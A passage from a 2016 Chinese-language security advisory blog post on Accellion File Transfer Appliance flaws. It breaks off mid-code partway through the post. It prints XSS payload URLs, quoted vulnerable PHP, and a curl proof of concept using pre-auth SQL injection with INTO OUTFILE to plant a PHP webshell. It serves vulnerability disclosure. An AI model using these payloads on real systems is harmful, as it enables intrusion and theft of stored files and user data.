

<!DOCTYPE html>
<html class="no-js sub-menu">

<head>
    <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
    <meta charset="utf-8" />
    <link href="/images/favicon.png" rel="icon" size="32x32">
    <!-- web fullscreen -->
    <meta name="apple-mobile-web-app-capable" content="yes"><!-- ios -->
    <meta name="mobile-web-app-capable" content="yes"><!-- android -->
    <meta name="viewport" content="width=device-width, initial-scale=1.0,user-scalable=0" />
    <meta name="format-detection" content="telephone=no">
    <title>Accellion File Transfer Appliance 弱點報告 | DEVCORE 戴夫寇爾</title>
    <link rel="stylesheet" href="/css/style.css" />
    <script src="/js/modernizr-custom.js"></script>
    <script src="/js/jquery-3.6.0.min.js"></script>
    <script src="/js/site.js"></script>
    <meta name="description" property="og:description" content="根據公開資料掃描，全球共發現 1217 台 FTA 存活主機，主要分布地點為美國，其次加拿大、澳洲、英國與新加坡。 根據存活主機的域名、SSL Certificate 發現 FTA 使用客戶遍及政府、教育、企業等領域，其中不乏一些知名品牌。" />
    <meta name="keywords" content="Advisory, Facebook, BugBounty, RCE, CVE" />
    <meta property="og:site_name" content="DEVCORE 戴夫寇爾" />
    <meta property="og:title" content="Accellion File Transfer Appliance 弱點報告 | DEVCORE 戴夫寇爾" />
    <meta property="og:url" content="https://devco.re/blog/2016/09/22/advisory-accellion-file-transfer-appliance-vulnerability/" />
    <meta property="og:type" content="website" />
    <meta property="og:image" content="https://devco.re/assets/img/blog/20160922/Accellion.jpeg" />
    <meta name="twitter:card" content="summary">
    <meta name="twitter:site" content="d3vc0r3">
    <meta name="twitter:title" content="Accellion File Transfer Appliance 弱點報告 | DEVCORE 戴夫寇爾">
    <meta name="twitter:description" content="根據公開資料掃描，全球共發現 1217 台 FTA 存活主機，主要分布地點為美國，其次加拿大、澳洲、英國與新加坡。 根據存活主機的域名、SSL Certificate 發現 FTA 使用客戶遍及政府、教育、企業等領域，其中不乏一些知名品牌。">
    <meta name="twitter:creator" content="d3vc0r3">
    <meta name="twitter:image:src" content="https://devco.re/assets/img/blog/20160922/Accellion.jpeg">
    <meta name="twitter:domain" content="devco.re">
    <meta name="google-site-verification" content="lMNi_XT6UmeGqeYI_vLHu5PDRi_uNVfnA2NdDGS4-lM" />
    <meta name="msvalidate.01" content="119FDBB7730BE45B162515BBB1FF6B33" />
    <meta name="alexaVerifyID" content="j-Es9N9SD7ckfA2EokOz9SZzhok" />
    <meta name='yandex-verification' content='4561963cf1d18fe3' />
    <meta property="fb:admins" content="120968921404653" />

    <link rel="canonical" href="https://devco.re/blog/2016/09/22/advisory-accellion-file-transfer-appliance-vulnerability/"/>
    <link rel="alternate" type="application/rss+xml" title="DEVCORE 戴夫寇爾" href="https://devco.re/rss">

    <!-- Google tag (gtag.js) -->
    <script async src="https://www.googletagmanager.com/gtag/js?id=G-GHXJ9PS005"></script>
    <script>
      window.dataLayer = window.dataLayer || [];
      function gtag(){dataLayer.push(arguments);}
      gtag('js', new Date());

      gtag('config', 'G-GHXJ9PS005');
    </script>
    <link rel="stylesheet" href="/fonts/inter.css" />
    <link rel="stylesheet" href="/css/highlighter.css" />
    <!-- <script src="https://cdn.jsdelivr.net/gh/google/code-prettify@master/loader/run_prettify.js"></script> -->
</head>
<body>
    <!-- 導覽列 start -->
    <header class="header">
<div class="container">
    <!-- logo start -->
    <div class="logo">
        <a href="/">
            <img src="/images/logo.svg"/>
        </a>
    </div>
    <!-- logo end -->
    <!-- 主選單 start -->
    <nav class="nav">
        <ul class="menu">
            <li class="dropdown">
                <div class="menuLable">
                    <span>服務<i class="icon arrow_down"></i></span>

                    <div class="menuItem">
                        <a href="/services/red-team/">
                            <div class="item">

                                <h2>
                                    <i class="icon menu service-red-team"></i>
                                    紅隊演練
                                </h2>
                                <p class="two-line">
                                    在不影響企業營運前提下，無所不用其極，從各種進入點執行模擬入侵攻擊，達成企業指定的演練情境。
                                </p>
                            </div>
                        </a>
                        <a href="/services/penetration-test/">
                            <div class="item">
                                <h2>
                                    <i class="icon menu service-penetration-test"></i>
                                    滲透測試
                                </h2>
                                <p class="two-line">
                                    以駭客思維及手法嘗試入侵企業指定系統，找出潛在漏洞，驗證企業資料與設備是否可被竊取或破壞。
                                </p>
                            </div>
                        </a>
                        <a href="/services/security-consulting/">
                            <div class="item">
                                <h2>
                                    <i class="icon menu service-security-consulting"></i>
                                    資安顧問服務
                                </h2>
                                <p class="two-line">
                                    以紅隊演練為基礎，提供攻擊者視角與可能入侵路徑，協助企業評估資安資源優先順序，並擬定長期防禦策略。
                                </p>
                            </div>
                        </a>
                        <a href="/services/security-training/">
                            <div class="item">
                                <h2>
                                    <i class="icon menu service-security-training"></i>
                                    資安教育訓練
                                </h2>
                                <p class="two-line">
                                    從攻擊思維出發，協助企業有效預防資安事故並防禦；以及事件發生時，如何快速判定攻擊目的、手法、漏洞與及應變方式。
                                </p>
                            </div>
                        </a>

                    </div>
                </div>
            </li>

            <li class="dropdown">
                <div class="menuLable">
                    <span>研究<i class="icon arrow_down"></i></span>

                    <div class="menuItem">
                        <a href="/research/overview/">
                            <div class="item">
                                <h2>
                                    <i class="icon menu search-circle"></i>
                                    總覽概要
                                </h2>
                                <p class="two-line">
                                    持續精研資安最新技術及漏洞研究趨勢，全方位檢測企業產品安全性、吸取經驗並轉化為紅隊演練工具與手法。
                                </p>
                            </div>
                        </a>
                        <a href="/research/awards/">
                            <div class="item">
                                <h2>
                                    <i class="icon menu badge-check"></i>
                                    競賽與獎項
                                </h2>
                                <p class="two-line">
                                    國際級資訊安全競賽獎項肯定。
                                </p>
                            </div>
                        </a>
                        <a href="/research/bug-bounty/">
                            <div class="item">
                                <h2>
                                    <i class="icon menu puzzle"></i>
                                    企業漏洞回報
                                </h2>
                                <p class="two-line">
                                    研究企業系統中的資安風險及各種可能的突破口，並通報企業修補。
                                </p>
                            </div>
                        </a>
                        <a href="/research/talks/">
                            <div class="item">
                                <h2>
                                    <i class="icon menu globe"></i>
                                    國際研討會
                                </h2>
                                <p class="two-line">
                                    參與全球資安盛會，發表、交流漏洞的知識與資訊。
                                </p>
                            </div>
                        </a>
                        <a href="/research/cve/">
                            <div class="item">
                                <h2>
                                    <i class="icon menu view-list"></i>
                                    CVE 漏洞列表
                                </h2>
                                <p class="two-line">
                                    挖掘並回報國際知名產品與服務的重大漏洞。
                                </p>
                            </div>
                        </a>
                    </div>
                </div>


            </li>

            <li class="dropdown">
                <div class="menuLable" href="#">
                    <span>公司<i class="icon arrow_down"></i></span>

                    <div class="menuItem">
                        <a href="/company/about/">
                        <div class="item">
                            <h2>
                                <i class="icon menu company"></i>
                                公司簡介
                            </h2>
                            <p>
                                DEVCORE 戴夫寇爾由世界級白帽駭客團隊創立，提供紅隊演練、滲透測試、資安顧問服務、資安教育訓練等服務。
                            </p>
                        </div>
                        </a>
                        <a href="/company/our-team/">
                            <div class="item">
                                <h2>
                                    <i class="icon menu team"></i>
                                    團隊成員
                                </h2>
                                <p class="two-line">
                                    由熱衷挑戰、具備駭客思維的資安專家組成，專注於創新攻擊手法研究，並以「高道德、高自律、高嚴謹」為最高指導原則。
                                </p>
                            </div>
                        </a>
                        <a href="/company/history/">
                            <div class="item">
                                <h2>
                                    <i class="icon menu milestone"></i>
                                    成就與沿革
                                </h2>
                                <p class="two-line">
                                    長期聚焦於攻擊研究，屢屢獲邀參與全球知名資安研討會，已揭露數百個重要產品漏洞、協助企業提升防禦能量。
                                </p>
                            </div>
                        </a>
                        <a href="/company/csr/">
                            <div class="item">
                                <h2>
                                    <i class="icon menu heart"></i>
                                    企業社會責任
                                </h2>
                                <p class="two-line">
                                    提供多元實習管道和研習計畫，提升新世代人才資安能量，推廣資訊安全意識。
                                </p>
                            </div>
                        </a>
                        <a href="/company/jobs/">
                            <div class="item">
                                <h2>
                                    <i class="icon menu briefcase"></i>
                                    工作機會
                                </h2>
                                <p class="two-line">
                                    加入 DEVCORE，共同改善資安產業結構，與我們一起打造更安全的世界。
                                </p>
                            </div>
                        </a>
                    </div>
                </div>
            </li>
            <li class="dropdown">
                <div class="menuLable">
                    <span>新聞<i class="icon arrow_down"></i></span>
                    <div class="menuItem">
                        <a href="/blog/">
                            <div class="item">
                                <h2>
                                    <i class="icon menu newspaper"></i>
                                    BLOG
                                </h2>
                                <p>
                                    DEVCORE 最新消息。
                                </p>
                            </div>
                        </a>
                        <a href="/media-kit/">
                            <div class="item">
                                <h2>
                                    <i class="icon menu download"></i>
                                    媒體素材下載
                                </h2>
                                <p>
                                    使用 DEVCORE 商標須遵循的使用規範。
                                </p>
                            </div>
                        </a>
                    </div>
                </div>
            </li>
            <li>
                <a class="menuLable" href="/search/">搜尋</a>
            </li>
            <li>
                <a class="menuLable" href="/contact/">聯絡我們</a>
            </li>
        </ul>
    </nav>
    <!-- 主選單 end -->
</div>


<!-- 手機板選單  start-->
<nav class="nav-m" id="menu-m">
    <ul class="menu">
        <li>
            <div class="menuLable">
                <span>服務</span>
                <div class="menuItem">
                    <a href="/services/red-team/" class="fullwidth">
                        <div class="item">
                            <h2>
                                <i class="icon service-red-team"></i>
                                紅隊演練
                            </h2>
                        </div>
                    </a>
                    <a href="/services/penetration-test/" class="fullwidth">
                        <div class="item">
                            <h2>
                                <i class="icon service-penetration-test"></i>
                                滲透測試
                            </h2>
                        </div>
                    </a>
                    <a href="/services/security-consulting/" class="fullwidth">
                        <div class="item">
                            <h2>
                                <i class="icon service-security-consulting"></i>
                                顧問服務
                            </h2>
                        </div>
                    </a>
                    <a href="/services/security-training/" class="fullwidth">
                        <div class="item">
                            <h2>
                                <i class="icon service-security-training"></i>
                                教育訓練
                            </h2>
                        </div>
                    </a>
                </div>
            </div>
        </li>
        <li>
            <div class="menuLable">
                <span>資安研究</span>
                <div class="menuItem">
                    <a href="/research/overview/" class="fullwidth">
                        <div class="item">
                            <h2>總覽概要</h2>
                        </div>
                    </a>
                    <a href="/research/awards/">
                        <div class="item">
                            <h2>競賽與獎項</h2>
                        </div>
                    </a>
                    <a href="/research/bug-bounty/">
                        <div class="item">
                            <h2>Bug Bounty</h2>
                        </div>
                    </a>
                    <a href="/research/talks/">
                        <div class="item">
                            <h2>國際研討會</h2>
                        </div>
                    </a>
                    <a href="/research/cve/">
                        <div class="item">
                            <h2>CVE 漏洞列表</h2>
                        </div>
                    </a>
                </div>
            </div>
        </li>

        <li>
            <div class="menuLable">
                <span>公司</span>
                <div class="menuItem">
                    <a href="/company/about/" class="fullwidth">
                        <div class="item">
                            <h2>公司簡介</h2>
                        </div>
                    </a>
                    <a href="/company/our-team/">
                        <div class="item">
                            <h2>團隊成員</h2>
                        </div>
                    </a>
                    <a href="/company/history/">
                        <div class="item">
                            <h2>成就與沿革</h2>
                        </div>
                    </a>
                    <a href="/company/csr/">
                        <div class="item">
                            <h2>企業社會責任</h2>
                        </div>
                    </a>
                    <a href="/company/jobs/">
                        <div class="item">
                            <h2>工作機會</h2>
                        </div>
                    </a>
                </div>
            </div>
        </li>
        <li>
            <div class="menuLable">
                <span>新聞</span>
                <div class="menuItem">
                    <!-- <a href="/blog/">
                    <div class="item">
                        <h2>所有文章</h2>
                    </div>
                    </a> -->
                    <!-- <a href="">
                        <div class="item">
                            <h2>案例剖析</h2>
                        </div>
                    </a> -->
                    <!-- <a href="">
                        <div class="item">
                            <h2>科普文章</h2>
                        </div>
                    </a>
                    <a href="">
                        <div class="item">
                            <h2>技術專欄</h2>
                        </div>
                    </a>
                    <a href="">
                        <div class="item">
                            <h2>資安新聞</h2>
                        </div>
                    </a> -->
                    <a href="/blog/">
                        <div class="item">
                            <h2>BLOG</h2>
                        </div>
                    </a>
                    <a href="/media-kit/">
                        <div class="item">
                            <h2>媒體素材下載</h2>
                        </div>
                    </a>
                </div>
            </div>
        </li>
        <li>
            <div class="menuLable">
                <div class="menuItem">
                    <a href="/search/" class="fullwidth">
                        <div class="item">
                            <h2 class="center">
                                <i class="icon search"></i>
                                搜尋
                            </h2>
                        </div>
                    </a>
                    <a href="/contact/" class="fullwidth">
                        <div class="item">
                            <h2 class="center">
                                <i class="icon chat-alt"></i>
                                聯絡我們
                            </h2>
                        </div>
                    </a>
                </div>
            </div>
        </li>
        <li>
            <div class="menuLable">
                <span><i class="icon translate"></i>Language</span>
                <div class="menuItem">
                    <a href="/">
                    <div class="item">
                        <h2>中文</h2>
                    </div>
                    </a>
                    <a href="/en">
                        <div class="item">
                            <h2>English</h2>
                        </div>
                    </a>
                </div>
            </div>
        </li>
    </ul>
</nav>
<!-- 手機板選單  end-->
    </header>
    <!-- 導覽列 end -->

    <!-- tab 選單 start -->
    <div class="sub-nav">
        <div class="container">
            <h1>BLOG</h1>
            <ul class="tab">
                <li>
                    <a href="/blog/">所有文章</a>
                </li>
                <li>
                    <a href="/blog/category/最新消息/">最新消息</a>
                </li>
                <li>
                    <a href="/blog/category/技術專欄/">技術專欄</a>
                </li>
                <li>
                    <a href="/blog/category/科普文章/">科普文章</a>
                </li>
                <li>
                    <a href="/blog/category/資安新聞/">資安新聞</a>
                </li>
                <li>
                    <a href="/media-kit/">媒體素材下載</a>
                </li>
            </ul>
        </div>
    </div>
    <!-- tab 選單 end -->
    
    <div class="main">
        <!-- 文章外層layer -->
        <section class="narrow">
            <!-- 文章 start -->
            <article class="article_body">
                <div class="content">
                    <a class="category" href="/blog/category/技術專欄">技術專欄</a>
                    <span class="tag">

                      <a href="/blog/tag/Advisory/">#Advisory</a> <a href="/blog/tag/Facebook/">#Facebook</a> <a href="/blog/tag/BugBounty/">#BugBounty</a> <a href="/blog/tag/RCE/">#RCE</a> <a href="/blog/tag/CVE/">#CVE</a> 
                    </span>
                    <h1>
                        Accellion File Transfer Appliance 弱點報告
                    </h1>
                    
                    
                    <div class="author_detail">
                        <span class="avatar">
                            <a href="/blog/author/orange">
                                <div class="circle">
                                    <i class="user" style="background-image: url('/assets/img/avatar/orig/orange.png');" ></i>
                                </div>
                            </a>
                        </span>
                        <span class="author"><a href="/blog/author/orange">Orange Tsai</a></span>
                        <span class="date">2016-09-22</span>
                    </div>
                    
                    
                    <div class="article_img">
                        <img src="https://devco.re/assets/img/blog/20160922/Accellion.jpeg"/>
                    </div>
                    

                    <hr>

                    <!-- 文章內容 -->
                    <div class="article_content">
<p>By <a href="http://blog.orange.tw/">Orange Tsai</a></p>

<p><a href="/blog/2016/09/22/advisory-accellion-file-transfer-appliance-vulnerability-eng-ver/">English Version</a> <br />
<a href="/blog/2016/09/22/advisory-accellion-file-transfer-appliance-vulnerability/">中文版本</a></p>

<hr />

<h3 id="accellion-fta-介紹">Accellion FTA 介紹</h3>
<p><br />
Accellion File Transfer Appliance (以下簡稱 FTA) 為一款安全檔案傳輸服務，可讓使用者線上分享、同步檔案，且所有檔案皆經 AES 128/256 加密，Enterprise 版本更支援 SSL VPN 服務並整合 AD, LDAP, Kerberos 等 Single Sign-on 機制。
<br /></p>

<!-- more -->

<h3 id="漏洞描述">漏洞描述</h3>
<p><br />
在研究過程中，於 FTA 版本 FTA_9_12_0 (13-Oct-2015 Release) 上，發現了下列弱點：</p>

<ul>
  <li>Cross-Site Scripting x 3</li>
  <li>Pre-Auth SQL Injection leads to Remote Code Execution</li>
  <li>Known-Secret-Key leads to Remote Code Execution</li>
  <li>Local Privilege Escalation x 2</li>
</ul>

<p>以上弱點可使不需經過認證的攻擊者，成功遠端攻擊 FTA 伺服器並取得最高權限，當攻擊者完全控制伺服器後，可取得伺服器上的加密檔案與用戶資料等。</p>

<p>弱點經回報 CERT/CC 後取得共四個獨立 CVE 編號 (CVE-2016-2350, CVE-2016-2351, CVE-2016-2352, CVE-2016-2353)。
<br /></p>

<h3 id="影響範圍">影響範圍</h3>
<p><br />
根據公開資料掃描，全球共發現 1217 台 FTA 存活主機，主要分布地點為美國，其次加拿大、澳洲、英國與新加坡。根據存活主機的域名、SSL Certificate 發現 FTA 使用客戶遍及政府、教育、企業等領域，其中不乏一些知名品牌。
<br /></p>

<h3 id="漏洞分析與利用">漏洞分析與利用</h3>
<p><br /></p>

<h4 id="multiple-cross-site-scripting-cve-2016-2350">Multiple Cross-Site Scripting (CVE-2016-2350)</h4>

<h5 id="1-xss-in-move_partition_framehtml">1. XSS in move_partition_frame.html</h5>

<blockquote>
  <p>https://&lt;fta&gt;/courier/move_partition_frame.html<br />
?f2=’-prompt(document.domain);//</p>
</blockquote>

<h5 id="2-xss-in-getimageajaxphp">2. XSS in getimageajax.php</h5>

<blockquote>
  <p>https://&lt;fta&gt;/courier/web/getimageajax.php<br />
?documentname=”onerror=”prompt(document.domain)//</p>
</blockquote>

<h5 id="3-xss-in-wminfohtml">3. XSS in wmInfo.html</h5>

<blockquote>
  <p>https://&lt;fta&gt;/courier/web/wmInfo.html<br />
?msg=ssologout<br />
&amp;loginurl=”&gt;&lt;svg/onload=”prompt(document.domain)</p>
</blockquote>

<p><br /></p>

<h4 id="pre-auth-sql-injection-leads-to-rce-cve-2016-2351">Pre-Auth SQL Injection leads to RCE (CVE-2016-2351)</h4>

<p>經過代碼審查後，在 FTA 中發現一個不須驗證的 SQL Injection，這使得惡意使用者可透過 SQL Injection 存取伺服器的敏感檔案及個人資料，並配合權限設定問題導致遠端代碼執行。問題出在 security_key2.api 中所呼叫到的 <code class="language-plaintext highlighter-rouge">client_properties( ... )</code> 函數中！</p>

<div class="highlight-name">/home/seos/courier/security_key2.api</div>

<figure class="highlight"><pre><code class="language-php" data-lang="php"><span class="c1">// ...</span>
<span class="nv">$password</span> <span class="o">=</span> <span class="nf">_decrypt</span><span class="p">(</span> <span class="nv">$password</span><span class="p">,</span> <span class="nf">_generate_key</span><span class="p">(</span> <span class="nv">$g_app_id</span><span class="p">,</span> <span class="nv">$client_id</span><span class="p">,</span> <span class="nv">$g_username</span> <span class="p">)</span> <span class="p">);</span>
<span class="nf">opendb</span><span class="p">();</span>
<span class="nv">$client_info</span> <span class="o">=</span> <span class="nf">client_properties</span><span class="p">(</span> <span class="nv">$client_id</span> <span class="p">)[</span><span class="mi">0</span><span class="p">];</span>
<span class="c1">// ...</span></code></pre></figure>

<p>其中 <code class="language-plaintext highlighter-rouge">$g_app_id</code> <code class="language-plaintext highlighter-rouge">$g_username</code> <code class="language-plaintext highlighter-rouge">$client_id</code> <code class="language-plaintext highlighter-rouge">$password</code> 皆為攻擊者可控參數，雖然有個 <code class="language-plaintext highlighter-rouge">_decrypt( ... )</code> 函數對密碼進行處理，但是與弱點觸發並無相關。其中要注意是 <code class="language-plaintext highlighter-rouge">$g_app_id</code> 的值會被代入成全域變數，代表當前使用的 Application ID，並且在 <code class="language-plaintext highlighter-rouge">opendb( )</code> 使用，其中在 <code class="language-plaintext highlighter-rouge">opendb( )</code> 內有以下代碼：</p>

<figure class="highlight"><pre><code class="language-php" data-lang="php"><span class="nv">$db</span> <span class="o">=</span> <span class="no">DB_MASTER</span> <span class="mf">.</span> <span class="nv">$g_app_id</span><span class="p">;</span>
<span class="k">if</span><span class="p">(</span><span class="o">!@</span><span class="nb">mysql_select_db</span><span class="p">(</span> <span class="nv">$db</span> <span class="p">))</span></code></pre></figure>

<p><code class="language-plaintext highlighter-rouge">mysql_select_db</code> 中所開啟資料庫的名稱由使用者可控，如給錯誤的值將導致程式無法繼續執行下去，所以必須將 <code class="language-plaintext highlighter-rouge">$g_app_id</code> 偽造成正確的內容。</p>

<p>接著是最主要的函數 <code class="language-plaintext highlighter-rouge">client_properties( $client_id )</code></p>

<figure class="highlight"><pre><code class="language-php" data-lang="php"><span class="k">function</span> <span class="n">client_properties</span><span class="p">(</span><span class="nv">$client_id</span> <span class="o">=</span> <span class="s1">''</span><span class="p">,</span> <span class="nv">$user</span> <span class="o">=</span> <span class="s1">''</span><span class="p">,</span> <span class="nv">$manager</span> <span class="o">=</span> <span class="s1">''</span><span class="p">,</span> <span class="nv">$client_type</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span> <span class="nv">$client_name</span> <span class="o">=</span> <span class="s1">''</span><span class="p">,</span> <span class="nv">$order_by</span> <span class="o">=</span> <span class="s1">'client_id'</span><span class="p">,</span> <span class="nv">$order_type</span> <span class="o">=</span> <span class="s1">'a'</span><span class="p">,</span> <span class="nv">$limit</span> <span class="o">=</span> <span class="s1">''</span><span class="p">,</span> <span class="nv">$offset</span> <span class="o">=</span> <span class="s1">''</span><span class="p">,</span> <span class="nv">$exclude_del</span> <span class="o">=</span> <span class="mi">1</span><span class="p">,</span> <span class="nv">$user_type</span> <span class="o">=</span> <span class="s1">''</span><span class="p">,</span> <span class="nv">$user_status</span> <span class="o">=</span> <span class="s1">''</span><span class="p">)</span> <span class="p">{</span>
    <span class="nv">$sql</span> <span class="o">=</span> <span class="p">(</span><span class="nv">$user_type</span>  <span class="o">=</span> <span class="s1">''</span> <span class="o">?</span> <span class="s1">'SELECT t_mail_server.* FROM t_mail_server '</span> <span class="o">:</span> <span class="s1">'SELECT t_mail_server.*, t_profile.c_flag as profile_flag FROM t_mail_server, t_profile '</span><span class="p">);</span>
    <span class="nv">$filter</span><span class="p">[</span><span class="s1">'client_id'</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$client_id</span><span class="p">;</span>
    <span class="nv">$filter</span><span class="p">[</span><span class="s1">'client_name'</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$client_name</span><span class="p">;</span>
    <span class="nv">$filter</span><span class="p">[</span><span class="s1">'client_type'</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$client_type</span><span class="p">;</span>
    <span class="nv">$filter</span><span class="p">[</span><span class="s1">'user'</span><span class="p">]</span> <span class="o">=</span> <span class="nf">mysql_escape_like</span><span class="p">(</span> <span class="nv">$user</span> <span class="p">);</span>
    <span class="nv">$filter</span><span class="p">[</span><span class="s1">'user_type'</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$user_type</span><span class="p">;</span>
    <span class="nv">$filter</span><span class="p">[</span><span class="s1">'manager'</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$manager</span><span class="p">;</span>
    <span class="nv">$filter</span><span class="p">[</span><span class="s1">'user_status'</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$user_status</span><span class="p">;</span>
    <span class="nv">$sql</span> <span class="o">&amp;=</span> <span class="nf">construct_where_clause</span><span class="p">(</span> <span class="nv">$filter</span><span class="p">,</span> <span class="nv">$exclude_del</span> <span class="p">);</span>

    <span class="c1">// ...</span>

    <span class="nv">$result</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span>  <span class="p">);</span>
    <span class="o">@</span><span class="nb">mysql_query</span><span class="p">(</span> <span class="nv">$sql</span> <span class="p">);</span>
    <span class="p">(</span> <span class="nv">$db_result</span> <span class="o">=</span>  <span class="o">||</span> <span class="nf">fatal_error</span><span class="p">(</span> <span class="s1">'exec:mysql_query('</span> <span class="mf">.</span> <span class="nv">$sql</span> <span class="mf">.</span> <span class="s1">') respond:'</span> <span class="mf">.</span> <span class="nb">mysql_error</span><span class="p">(</span>  <span class="p">),</span> <span class="k">__FILE__</span><span class="p">,</span> <span class="mi">221</span> <span class="p">)</span> <span class="p">);</span></code></pre></figure>

<figure class="highlight"><pre><code class="language-php" data-lang="php"><span class="k">function</span> <span class="n">construct_where_clause</span><span class="p">(</span><span class="nv">$filter</span><span class="p">,</span> <span class="nv">$exclude_del</span> <span class="o">=</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
    <span class="nv">$where_clause</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span>  <span class="p">);</span>
    <span class="nv">$where_clause</span><span class="p">[]</span> <span class="o">=</span> <span class="s1">'c_server_id  != \'999\''</span><span class="p">;</span>

    <span class="k">if</span> <span class="p">(</span><span class="nv">$exclude_del</span><span class="p">)</span> <span class="p">{</span>
        <span class="nv">$where_clause</span><span class="p">[]</span> <span class="o">=</span> <span class="s1">'!(t_mail_server.c_flag &amp; '</span> <span class="mf">.</span> <span class="no">CLIENT_DELETED</span> <span class="mf">.</span> <span class="s1">')'</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="k">if</span> <span class="p">(</span><span class="nv">$filter</span><span class="p">[</span><span class="s1">'client_id'</span><span class="p">]</span> <span class="o">!=</span> <span class="s1">''</span><span class="p">)</span> <span class="p">{</span>
        <span class="nv">$where_clause</span><span class="p">[]</span> <span class="o">=</span> <span class="s1">'c_server_id = \''</span> <span class="mf">.</span> <span class="nv">$filter</span><span class="p">[</span><span class="s1">'client_id'</span><span class="p">]</span> <span class="mf">.</span> <span class="s1">'\''</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="k">if</span> <span class="p">(</span><span class="nv">$filter</span><span class="p">[</span><span class="s1">'manager'</span><span class="p">]</span> <span class="o">!=</span> <span class="s1">''</span><span class="p">)</span> <span class="p">{</span>
        <span class="nv">$filter</span><span class="p">[</span><span class="s1">'manager'</span><span class="p">]</span> <span class="o">=</span> <span class="nb">mysql_real_escape_string</span><span class="p">(</span> <span class="nv">$filter</span><span class="p">[</span><span class="s1">'manager'</span><span class="p">]</span> <span class="p">);</span>
        <span class="nv">$where_clause</span><span class="p">[]</span> <span class="o">=</span> <span class="s1">'c_manager = \''</span> <span class="mf">.</span> <span class="nv">$filter</span><span class="p">[</span><span class="s1">'manager'</span><span class="p">]</span> <span class="mf">.</span> <span class="s1">'\''</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="k">if</span> <span class="p">(</span><span class="nv">$filter</span><span class="p">[</span><span class="s1">'client_name'</span><span class="p">]</span> <span class="o">!=</span> <span class="s1">''</span><span class="p">)</span> <span class="p">{</span>
        <span class="nv">$filter</span><span class="p">[</span><span class="s1">'client_name'</span><span class="p">]</span> <span class="o">=</span> <span class="nb">mysql_real_escape_string</span><span class="p">(</span> <span class="nv">$filter</span><span class="p">[</span><span class="s1">'client_name'</span><span class="p">]</span> <span class="p">);</span>
        <span class="nv">$where_clause</span><span class="p">[]</span> <span class="o">=</span> <span class="s1">'t_mail_server.c_name LIKE \'%'</span> <span class="mf">.</span> <span class="nv">$filter</span><span class="p">[</span><span class="s1">'client_name'</span><span class="p">]</span> <span class="mf">.</span> <span class="s1">'%\''</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="k">if</span> <span class="p">((</span> <span class="nv">$filter</span><span class="p">[</span><span class="s1">'user'</span><span class="p">]</span> <span class="o">!=</span> <span class="s1">''</span> <span class="o">&amp;&amp;</span> <span class="nv">$filter</span><span class="p">[</span><span class="s1">'user'</span><span class="p">]</span> <span class="o">!=</span> <span class="s1">'%%'</span> <span class="p">))</span> <span class="p">{</span>
        <span class="nv">$filter</span><span class="p">[</span><span class="s1">'user'</span><span class="p">]</span> <span class="o">=</span> <span class="nb">mysql_real_escape_string</span><span class="p">(</span> <span class="nv">$filter</span><span class="p">[</span><span class="s1">'user'</span><span class="p">]</span> <span class="p">);</span>
        <span class="nv">$where_clause</span><span class="p">[]</span> <span class="o">=</span> <span class="s1">'t_mail_server.c_user_id LIKE \''</span> <span class="mf">.</span> <span class="nv">$filter</span><span class="p">[</span><span class="s1">'user'</span><span class="p">]</span> <span class="mf">.</span> <span class="s1">'\''</span><span class="p">;</span>
    <span class="p">}</span></code></pre></figure>

<p><code class="language-plaintext highlighter-rouge">client_properties( ... )</code> 中會將所傳進的參數進行 SQL 語句的拼裝，而 <code class="language-plaintext highlighter-rouge">construct_where_clause( ... )</code> 為最關鍵的一個函數。
在 <code class="language-plaintext highlighter-rouge">construct_where_clause( ... )</code> 中可以看到參數皆使用 <code class="language-plaintext highlighter-rouge">mysql_real_escape_string</code> 來防禦但唯獨缺少 <code class="language-plaintext highlighter-rouge">$client_id</code>，從原始碼的 Coding Style 觀察猜測應該是開發時的疏忽，因此根據程式流程送出對應的參數即可觸發 SQL Injection。</p>

<p>此外，在 FTA 中資料庫使用者為 root 具有 FILE_PRIV 權限，因此可使用 <code class="language-plaintext highlighter-rouge">INTO OUTFILE</code> 撰寫自己 PHP 代碼至可寫目錄達成遠端代碼執行！</p>

<p><strong>PoC</strong></p>

<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="nv">$ </span>curl https://&lt;fta&gt;/courier/1000@/security_key2.api <span class="nt">-d</span> <span class="s2">"aid=1000&amp;user_id=1&amp;password=1&amp;client_id=' OR 1=1 LIMIT 1 INTO OUTFILE '/home/seos/courier/themes/templates/.cc.php' LINES TERMINATED BY 0x3c3f...#"</span></code></pre></figure>

<p>生成的 PHP 檔案位置在</p>

<blockquote>
  <p>http://&lt;fta&gt;/courier/themes/templates/.cc.php</p>
</blockquote>

<p><br /></p>

<h4 id="known-secret-key-leads-to-remote-code-execution">Known Secret-Key leads to Remote Code Execution</h4>

<p>在前個弱點中，要達成遠端代碼執行還有一個條件是要存在可寫目錄，但現實中有機率找不到可寫的目錄放置 Webshell，因此無法從 SQL Injection 達成代碼執行，不過這時有另外一條路可以幫助我們達成遠端代碼執行。</p>

<p>這個弱點的前提條件是 <strong>已知資料庫中所存的加密 KEY</strong></p>

<p>這點對我們來說不是問題，從前面的 SQL Injection 弱點可任意讀取資料庫內容，另外雖然在程式碼中有對參數進行一些過濾，但那些過濾是可以繞過的！</p>

<div class="highlight-name">/home/seos/courier/sfUtils.api</div>

<figure class="highlight"><pre><code class="language-php" data-lang="php"><span class="nv">$func_call</span> <span class="o">=</span> <span class="nf">decrypt</span><span class="p">(</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">'fc'</span><span class="p">]</span> <span class="p">);</span>
<span class="nv">$orig_func</span> <span class="o">=</span> <span class="s1">''</span><span class="p">;</span>
